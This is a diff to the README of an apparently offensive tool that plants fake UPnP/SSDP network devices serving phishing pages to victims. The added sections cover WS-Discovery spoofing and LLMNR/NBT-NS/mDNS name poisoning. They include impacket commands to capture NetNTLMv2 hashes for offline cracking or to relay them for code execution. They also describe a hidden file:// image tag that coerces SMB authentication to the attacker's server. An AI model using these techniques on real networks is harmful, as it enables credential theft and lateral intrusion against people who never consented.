@@ -170,10 +170,16 @@ All captured events are logged to `logs-essdp.txt` with timestamps:
 ## Common UPnP Device Types
 
 The `deviceType` you declare in `device.xml` decides which category the fake device
-lands in on the victim's machine — in Windows Explorer's **Network** view, a
-`Printer:1` shows up under *Printers* while an `InternetGatewayDevice:1` shows up
-under *Network Infrastructure*. Pick the one that matches the story your
-`friendlyName` tells. 
+lands in on the victim's machine — in Windows Explorer's **Network** view, an
+`InternetGatewayDevice:1` shows up under *Network Infrastructure* while a
+`MediaServer:1` shows up under *Media Devices*. Pick the one that matches the story your
+`friendlyName` tells.
+
+> **Important:** only some of these categories actually come from UPnP/SSDP. Windows
+> discovers **printers and scanners via WS-Discovery (WSD), not SSDP** — so a
+> `Printer:1`/`Scanner:1` advertised over SSDP will **not** reliably appear under
+> *Printers*. Use `--wsd` for printer/scanner visibility on Windows 10/11 (see
+> *Extended discovery & credential capture* below). 
 
 ### Standard UPnP Forum types
 
@@ -187,11 +193,15 @@ under *Network Infrastructure*. Pick the one that matches the story your
 | Wireless access point | `urn:schemas-upnp-org:device:WLANAccessPointDevice:1` | Network Infrastructure |
 | Media Server | `urn:schemas-upnp-org:device:MediaServer:1` (also `:2` `:3` `:4`) | Media Devices |
 | Media Renderer | `urn:schemas-upnp-org:device:MediaRenderer:1` (also `:2` `:3`) | Media Devices |
-| Printer | `urn:schemas-upnp-org:device:Printer:1` | Printers |
-| Scanner | `urn:schemas-upnp-org:device:Scanner:1` | Printers |
+| Printer | `urn:schemas-upnp-org:device:Printer:1` | Printers¹ |
+| Scanner | `urn:schemas-upnp-org:device:Scanner:1` | Printers¹ |
 | Camera | `urn:schemas-upnp-org:device:DigitalSecurityCamera:1` | Other Devices |
 | Light | `urn:schemas-upnp-org:device:BinaryLight:1` | Other Devices |
 | Dimmable light | `urn:schemas-upnp-org:device:DimmableLight:1` | Other Devices |
+
+> ¹ Windows discovers printers/scanners over **WS-Discovery (WSD)**, not SSDP — a
+> `Printer:1`/`Scanner:1` advertised via SSDP will not reliably land under *Printers*.
+> Run with `--wsd` for printer/scanner visibility on modern Windows.
 
 `Basic:1` is the fallback when nothing fits. Appliances with no dedicated UPnP
 profile — a BMC, an identity provider, a firewall — should use it.
@@ -220,6 +230,63 @@ response.
 > **Tip:** rather than guessing, run analyze mode first (`-a`). The server logs every
 > `ST` it sees (`New host detected: … (ST: …)`), so you can see what the target
 > network actually searches for before deciding what to advertise.
+---
+
+## Extended discovery & credential capture
+
+Beyond the classic SSDP M-SEARCH responder, the server can reach more hosts and
+harvest credentials through additional protocols. These are **opt-in** flags.
+
+### Reach more hosts (still SSDP)
+
+- **Proactive `NOTIFY ssdp:alive`** — on by default (disable with `--no-notify`).
+  The original tool is purely *reactive*: it only appears to a host after that host
+  sends an M-SEARCH. NOTIFY multicasts the fake devices into every SSDP listener's
+  cache without waiting to be searched, re-announces every `--notify-interval` seconds
+  (default 900), and sends `ssdp:byebye` on shutdown.
+- **WS-Discovery** (`--wsd`) — the SOAP-over-UDP protocol (UDP 3702) that Windows
+  10/11 *Network* Explorer actually uses (SSDP is still live, but WSD covers printers,
+  scanners and cross-subnet discovery that SSDP does not). Sends a WSD `Hello` on
+  start, answers `Probe`/`Resolve`, and serves device metadata from the existing HTTP
+  server (`/wsd/<idx>/metadata.xml`), reusing the same templates and phishing pages.
+  > WSD device *Types*/metadata are modeled on `christgau/wsdd`; confirm visibility
+  > against a real Windows 10/11 target — it depends on the victim's services and
+  > network profile.
+
+### More access — name poisoning → NetNTLM (Responder class)
+
+Instead of waiting for a human to type a password, answer the victim's **failed name
+lookups** with "that host is me" and let Windows authenticate to you automatically:
+
+- `--llmnr` (UDP 5355, `224.0.0.252`), `--nbtns` (UDP 137 broadcast),
+  `--mdns` (UDP 5353, `224.0.0.251`), or `--poison` for all three.
+- `--respond-to NAME ...` restricts poisoning to specific names.
+
+**The catch:** poisoning only *redirects* the victim to you. The NetNTLM hash lives in
+the SMB/HTTP auth handshake that follows, which Flask cannot speak. Capture it with
+[impacket](https://github.com/fortra/impacket):
+
+```bash
+# Capture NetNTLMv2 (crack offline: hashcat -m 5600)
+sudo impacket-smbserver -smb2support -ip <local_ip> share ./loot     # or: --smb-capture
+
+# Relay live (code-exec / LDAP escalation, no cracking)
+sudo impacket-ntlmrelayx -t <target> -smb2support                    # or: --relay <target>
+```
+
+`--smb-capture` / `--relay` launch impacket for you if it is on `PATH`.
+
+### Honest caveats
+
+- The templates' hidden `<img src="file://///{{ smb_server }}/smb/hash.jpg">` restores
+  the upstream SMB-coercion trick, **but modern Chromium/Edge/Firefox block `file://`
+  and UNC subresources loaded from an HTTP page** — so it is unreliable from a browser.
+  The dependable NetNTLM leak is the **OS-level poisoners above**, not the `<img>`.
+- **SMB relay fails against SMB-signing hosts** — the default on Windows 11 24H2,
+  Server 2025, and all Domain Controllers.
+- LLMNR/NBT-NS are being phased out (LLMNR off by default on Win11 24H2; disabled by
+  CIS/STIG hardening), so yield is lower on modern/hardened networks.
+
 ---
 
 ## References
